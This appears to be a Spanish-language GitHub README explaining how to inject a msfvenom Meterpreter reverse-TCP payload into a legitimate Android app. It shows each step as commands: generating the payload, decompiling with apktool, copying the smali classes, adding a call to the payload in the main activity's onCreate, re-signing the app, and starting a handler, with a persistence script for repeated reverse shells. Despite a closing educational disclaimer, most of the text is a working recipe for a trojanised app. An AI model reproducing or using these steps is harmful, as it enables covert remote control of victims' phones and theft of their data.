# Android-11+ Persistence-Payload-with-msfvenom-and-Custom-Service-Injection

Crea un payload persistente para dispositivos Android actualizado debido a que el metodo antiguo fue parcheado para las versiones mas recientes de Android, utilizando **msfvenom** para generar un servicio que se ejecuta automáticamente tras el reinicio del dispositivo, aprovechando el receptor BOOT_COMPLETED en el **AndroidManifest.xml**

-Este script fue probado en **Android 13**


![image](https://github.com/user-attachments/assets/b7eb875a-7ea9-45a3-889a-f36d00c665ec)

## Generación de Payload con Msfvenom

Para generar un payload de Android con `msfvenom`, utilizamos el siguiente comando. Este comando crea un archivo APK con un payload que ejecutará un servicio en segundo plano en el dispositivo víctima. Asegúrate de personalizar el nombre del archivo y la dirección IP de tu máquina atacante.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=<tu_puerto> -o payload.apk
```

## Descompilación del Payload y la Aplicación Base

Una vez generado el payload, el siguiente paso es descompilarlo junto con la aplicación base en la que se va a inyectar el payload . Para hacerlo, utilizamos `apktool` (herramienta que ya viene preinstalada en Kali Linux).

El comando para descompilar es el siguiente:

```bash
apktool d -f <archivo.apk> -o <directorio_de_salida>
```


![image](https://github.com/user-attachments/assets/8d4833dc-2039-482a-acd8-b622c8063218)



## Integración del Payload en la Aplicación Base

Después de descompilar tanto el payload como la aplicación base, el siguiente paso es integrar el payload en la app base. Sigue estos pasos:

1. **Copiar los archivos del Payload**:
   Debes copiar todos los archivos del payload en la ruta `smali/com/metasploit/stage/Payload.smali` dentro de la carpeta de la app base. Para ello, crear los directorios y usar el siguiente comando para copiar los archivos al directorio correspondiente.

```bash
   cp -r payload/smali/com/metasploit/stage/* original/smali/com/metasploit/stage/
```

2. **Modificar el archivo AndroidManifest.xml**:
  En el AndroidManifest.xml de la aplicación base y localiza la sección <activity> que corresponde a la actividad principal es decir el *android.intent.action.**MAIN***. Modifica el archivo .smali de la actividad principal para que apunte al payload


```xml
  <activity android:name="com.paquete.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>

```
3. **Modificar el Archivo .Smali**
   Una vez identificado el archivo de esa actividad, en el metodo ***onCreate***, insetar la siguente linea:
Busqueda de el metodo:
```bash
   cat file | grep -n onCreate
```
   
```bash
   invoke-static {p0}, Lcom/metasploit/stage/Payload; ->onCreate(Landroid/context/Context;)V
```


![image](https://github.com/user-attachments/assets/1d49457a-d11e-4424-b851-2b8071a97afc)


3. **Recompilar la Aplicación:**
    Una vez inyectado el payload a la aplicación base, recompilar la aplicación con el siguiente comando:


```bash
   apktool b output_base_app -o modified_app.apk
```

4. **Firmar el APK:**
 Finalmente, firmar el APK para poder instalarlo en un dispositivo Android. Utilizando jarsigner y key tool para firmarlo:

### Generación de llave
```bash
   keytool -genkey -V -keystore ./key.keystore -alias "alias" -keyalg RSA -keysize 2048 -validity 1000
```

### Firma de el APK:

```bash
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ./key.keystore ruta/APP.apk "alias"
```

## Explotación y ejecucion de persistencia

- Una vez instalada la app en el telefono *Target*, e iniciada una sesion *meterpreter*, subir el archivo ***Persistence.sh*** el cual puede ser modificado para el tiempo entre intervalos de intentos de establecer una ***reverse_shell***.

```bash
   msfconsole -q -x "use exploit/multi/handler ; set payload android/meterpreter/reverse_tcp; set LHOST "host"; set LPORT 443; run"
```

![image](https://github.com/user-attachments/assets/3463b265-6eec-4d0d-bc46-e44cacd759e6)



> **Advertencia**: Este material y las técnicas descritas en este repositorio son **estrictamente para fines educativos y de investigación**. El uso de herramientas de penetración y explotación debe realizarse solo en sistemas que **tienes permiso explícito** para evaluar. El uso no autorizado de estas técnicas en sistemas ajenos está **prohibido** y es **ilegal** en muchas jurisdicciones. Cualquier daño o impacto negativo causado por el uso inapropiado de este contenido es responsabilidad exclusiva del usuario.

> Se recomienda a los usuarios que trabajen en entornos controlados, como **laboratorios de pruebas**, y que cumplan con todas las leyes y regulaciones locales relacionadas con la seguridad informática y el hacking ético. ***happy hacking :D***

